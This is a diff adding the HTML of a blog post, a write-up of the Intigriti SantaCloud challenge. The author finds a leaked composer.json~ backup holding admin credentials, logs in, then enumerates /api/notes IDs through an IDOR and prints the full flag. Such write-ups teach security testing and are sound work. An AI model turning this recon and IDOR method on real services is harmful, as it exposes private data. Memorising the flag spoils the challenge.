@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Intigriti | SantaCloud Challenge Writeup | Yours, Sto ʚɞ</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap">
+
+      <script src="/js/main.js"></script>
+
+
+<meta name="description" content="Sensitive information exposed plus an IDOR, and voilà, the flag ^^ This write-up covers the SantaCloud Intigriti challenge from this holiday season.">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti | SantaCloud Challenge Writeup">
+<meta property="og:description" content="Sensitive information exposed plus an IDOR, and voilà, the flag ^^ This write-up covers the SantaCloud Intigriti challenge from this holiday season.">
+<meta property="og:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Intigriti | SantaCloud Challenge Writeup">
+<meta name="twitter:description" content="Sensitive information exposed plus an IDOR, and voilà, the flag ^^ This write-up covers the SantaCloud Intigriti challenge from this holiday season.">
+<meta name="twitter:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="google-site-verification" content="HZuVMLvcO_JxYvwt6swb5-dfFikUHJW1aVEEvBvEDtI" />
+</head>
+<body>
+  <header>
+    <a href="/"><h3>Yours, Sto ʚɞ</h3></a>
+
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    <li>
+      <a href="/whoami/">Whoami</a>
+    </li>
+    </ul>
+  </nav>
+
+</div>
+
+  </header>
+  <main>
+    
+  <h1>Intigriti | SantaCloud Challenge Writeup</h1>
+
+    
+      <p class="date">Dec 29, 2025</p>
+    
+
+
+    
+    
+  <div class="tags">
+    
+    <ul>
+        <li><a href="/tags/idor/">#IDOR</a></li>
+    </ul>
+  </div>
+
+    
+    <div class="content">
+      <p>During the holidays, just when I thought the Xmas CTFs were over, I received a Discord notification about a special Intigriti holiday challenge. With one more to go, that, kids, is how a cozy day quietly turns into a cozy day <em>sprinkled with flags</em>. SantaCloud was a cool and simple challenge where recon was the key.</p>
+<p>Let&rsquo;s get into its details</p>
+<p>We first land on <code>https://santacloud.intigriti.io/home</code>. We can see that we have an access portal where we can only sign in.
+<img src="image.png" alt="alt text"></p>
+<p>We first try enumerating the different endpoints by inspecting the code of the pages :</p>
+<p>-<code>home</code>and <code>/login</code> which provide the same functionality of logging in, and we can see from the code source of the latter that once we do we will be redirected to <code>/dashboard</code>.</p>
+<ul>
+<li><code>/dashboard</code> providing a global dashboard including <code>/inventory</code> and <code>/map</code></li>
+<li><code>/profile</code>to view the user profile</li>
+<li><code>/notes</code> to access notes</li>
+<li><code>/up</code> which is a healthcheck endpoint for the app
+/api/login</li>
+</ul>
+<p>Nevertheless, to really access the <code>/dashboard</code> and be able to interact with the last 5 endpoints, we need to login, as an <code>auth_login</code> is needed.</p>
+<p>We first try to check for any vulnerabilities in the login form. We try different payloads even for NoSQLi, but in vain.</p>
+<p>Hence, we dig a bit more into recon. Through fuzzing, we find <code>/robots.txt</code>with the following content :</p>
+<pre tabindex="0"><code>User-agent: *
+Allow: /
+
+# Disallow indexing of sensitive config files
+Disallow: /package.json
+Disallow: /backup.json
+Disallow: /artisan
+Disallow: /.env
+Disallow: /.env.local
+Disallow: /composer.json
+Disallow: /composer.json*
+Disallow: /composer.json~
+</code></pre><p>Given the latter, we try to access the endpoints listed in the file. After some seconds, we obtain code 200 for <code>https://santacloud.intigriti.io/composer.json~</code>.</p>
+<p>We check its content and we obtain the content below :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;intigriti-challenges/santacloud&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;project&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;SantaCloud - Supply Chain Portal&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;13.3.7&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;keywords&#34;</span>: [<span style="color:#e6db74">&#34;laravel&#34;</span>, <span style="color:#e6db74">&#34;gifts&#34;</span>, <span style="color:#e6db74">&#34;christmas&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;MIT&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;config&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;admin-access&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;elf_supervisor&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;CookiesAndMilk1337&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;api-endpoint&#34;</span>: <span style="color:#e6db74">&#34;http://santacloud.intigriti.io/login&#34;</span>,
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;env&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;secret&#34;</span>: <span style="color:#e6db74">&#34;INTIGRITI{019b118e-e563-7348&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;ttl&#34;</span>: <span style="color:#ae81ff">3600</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;require&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;php&#34;</span>: <span style="color:#e6db74">&#34;^8.2&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;laravel/framework&#34;</span>: <span style="color:#e6db74">&#34;^10.0&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;firebase/php-jwt&#34;</span>: <span style="color:#e6db74">&#34;^6.10&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;authors&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Elf Supervisor&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;devops@santacloud.intigriti.io&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;support&#34;</span>: {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This file contains what we need <em>and more</em> as it holds not only the admin credentials but also a part of the flag! This is pure &ldquo;Use of Hard-coded Credentials&rdquo; as such file should never be exposed.</p>
+<p>Let&rsquo;s login using <code>elf_supervisor:CookiesAndMilk1337</code>, now we have full access to the app and we see that our user is admin.
+<img src="image-1.png" alt="alt text"></p>
+<p>We check the internal notes, and we read the last one which says :
+<img src="image-2.png" alt="alt text"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>URGENT: API Security Training Schedule
+</span></span><span style="display:flex;"><span>12/25/2025
+</span></span><span style="display:flex;"><span>Shared
+</span></span><span style="display:flex;"><span>Following yesterday&#39;s incident where an elf worker discovered unauthorized gift allocations through cookie delivery logs, we&#39;re implementing mandatory API security training: week 1: Authentication Fundamentals, week 2: Data Access Control <span style="color:#960050;background-color:#1e0010">&amp;</span> Authorization, week 3: Input Validation <span style="color:#960050;background-color:#1e0010">&amp;</span> Security Patterns. INCIDENT SUMMARY: A naughty-list recipient somehow received gifts meant for multiple users. Initial investigation suggests they manipulated their user identifier in API requests to access other recipients&#39; gift allocations. We must prevent parameter tampering going forward.
+</span></span></code></pre></div><p>That suggests an Insecure Direct Object Reference (IDOR) somewhere 👀</p>
+<p>We also see in the javascript of the <code>/notes</code> page the following :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Edit note
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">editNote</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">noteId</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/api/notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Authorization&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`Bearer </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">ok</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">note</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">note</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;form-title&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Edit Note&#39;</span>;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;note-id&#39;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">id</span>;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;note-title&#39;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">title</span>;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;note-content&#39;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">content</span>;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;note-private&#39;</span>).<span style="color:#a6e22e">checked</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">is_private</span>;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;note-form-container&#39;</span>).<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#39;hidden&#39;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">scrollTo</span>({ <span style="color:#a6e22e">top</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">behavior</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;smooth&#39;</span> });
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error loading note:&#39;</span>, <span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Error loading note. Please try again.&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>So, we can actually access notes using <code>/api/notes/${noteId}</code>. After adding to our requests the header <code>Authorization: Bearer &lt;our_auth_token&gt;</code>, let&rsquo;s try to enumerate them one by one.</p>
+<p>One, Two.. and we got our flag in the third note by running the request <code>GET /api/notes/3 HTTP/2</code> !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>HTTP/2 200 OK
+</span></span><span style="display:flex;"><span>Date: Fri, 26 Dec 2025 01:38:13 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Vary: Authorization
+</span></span><span style="display:flex;"><span>X-Powered-By: PHP/8.2.30
+</span></span><span style="display:flex;"><span>Cache-Control: no-cache, private
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin: *
+</span></span><span style="display:flex;"><span>Strict-Transport-Security: max-age=31536000; includeSubDomains
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{ &#34;success&#34;:true,
+</span></span><span style="display:flex;"><span>  &#34;note&#34;:
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            &#34;id&#34;:3,
+</span></span><span style="display:flex;"><span>            &#34;user_id&#34;:1,
+</span></span><span style="display:flex;"><span>            &#34;title&#34;:&#34;The Secret Key&#34;,
+</span></span><span style="display:flex;"><span>            &#34;content&#34;:&#34;INTIGRITI{019b118e-e563-7348-a377-c1e5f944bb46}&#34;,
+</span></span><span style="display:flex;"><span>            &#34;is_private&#34;:true,&#34;created_at&#34;:&#34;2025-12-25T18:59:10.000000Z&#34;,
+</span></span><span style="display:flex;"><span>            &#34;updated_at&#34;:&#34;2025-12-25T18:59:10.000000Z&#34;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Finally, our flag is complete :
+<strong>INTIGRITI{019b118e-e563-7348-a377-c1e5f944bb46}</strong></p>
+
+    </div>
+    
+
+  </div>
+
+
+  </main>
+  <footer>
+    
+<p>© 2025 Sto ʚɞ. All rights reserved.</p>
+  </footer>
+</body>
+</html>
